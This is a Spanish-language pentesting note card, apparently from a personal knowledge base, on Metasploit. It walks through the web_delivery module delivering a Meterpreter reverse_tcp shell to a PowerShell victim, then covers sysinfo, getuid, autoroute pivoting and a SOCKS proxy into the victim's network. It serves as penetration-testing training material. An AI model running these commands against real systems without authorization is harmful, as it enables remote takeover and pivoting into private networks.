---
Herramienta: 💣 Metasploit
Comando: msfconsole
Categoría: Explotación y post-explotación
SO: Multiplataforma
tags:
  - explotación
  - post-explotación
  - c2
  - pentesting
  - herramienta
---

## Descripción

**Metasploit** es un framework de pruebas de penetración ampliamente utilizado que permite descubrir, explotar y manejar vulnerabilidades en sistemas informáticos. Es una herramienta modular que incluye exploits, payloads y herramientas de post-explotación para escenarios reales y pruebas de laboratorio.

## Características clave

- **Framework modular**: Incluye miles de exploits, payloads y módulos auxiliares.
- **Post-explotación**: Herramientas avanzadas para mantener acceso y extraer información.
- **Pruebas de seguridad**: Ideal para pruebas de penetración en redes y aplicaciones.
- **Multiplataforma**: Funciona en Windows, Linux y macOS.

## Ejemplo de uso

### Ejemplo 1

Vamos a seguir el ejemplo 1 de Powershell empire

Ejecuta la consola de Metasploit:

```bash
msfconsole

#Para buscar un determinado módulo podemos usar el comando search

search web_delivery

#En este caso vamos a utilizar el modulo web_delivery. Para mostras las opciones podemos utilizar el comando show options

show options
set target 2

#Hemos puesto el target 2 ya que vamos a atacar a un powershell. También vamos a tener que cambiar la ip para que apunte la conexión hacia nuestro sistema

Set LHOST ip
Set SRVHOST ip

#Ambas ips han de ser la de nuestro ordenador como pone en las instrucciones del modulo.

set payload windows/meterpreter/reverse_tcp

#Este cambio de payload (generalmente es automatico) nos permite especificar la sesión.

exploit

#Esto nos dará el comando a ejecutar en el host victima para conectarnos

sessions

#Con este comando vemos las sesiones actuales

sessions x

#Con este comando nos conectamos a una sesion
```

**Después del ejemplo 1 de powershell empire**:

Parece que tras la ejecución del payload generado por metasploit tenemos una sesión de meterpreter, a partir de aquí hay varios comandos que podemos utilizar.

```cmd
sysinfo

#nos proporciona información del sistema

getuid

#nos porporciona información del usuario actual, con ctrl + z podemos dejar la sesion en background y vamos a pobrar otro modulo

search autoroute
set SESSION 1
run

#Esto nos permite crear una ruta con el host victima (en la sesión que tenemos creada).

use auxiliary/server/socks_proxy
set SRVHOST ip #nuestra
run

#Este modulo nos permite vincular nuestro navegador al suyo y hay que cambiar el proxy en el navegador y poner nuestra ip y el puerto vinculado al del modulo y ya simplemente con poner el dominio o ip victima deberíamos ver el puerto 8080 de ese servidor
```

